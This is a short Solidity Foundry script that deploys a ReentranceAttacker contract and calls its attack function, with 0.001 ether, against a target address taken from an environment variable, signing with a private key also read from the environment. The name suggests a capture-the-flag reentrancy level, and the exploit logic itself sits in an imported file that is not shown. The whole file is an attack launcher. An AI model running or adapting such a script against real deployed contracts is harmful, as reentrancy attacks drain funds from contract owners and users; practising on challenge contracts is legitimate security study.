// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "forge-std/Test.sol";
import "../src/ReentranceAttacker.sol";

contract ReentranceAttackScript is Script {
    function setUp() public {}

    function run() public {
        uint256 deployerPrivateKey = vm.envUint("PK");
        address reentranceAddress = vm.envAddress("REENTRANCE_ADDRESS");
        vm.startBroadcast(deployerPrivateKey);
        ReentranceAttacker attacker = new ReentranceAttacker();
        attacker.attack{value: 0.001 ether}(reentranceAddress);
        vm.stopBroadcast();
    }
}
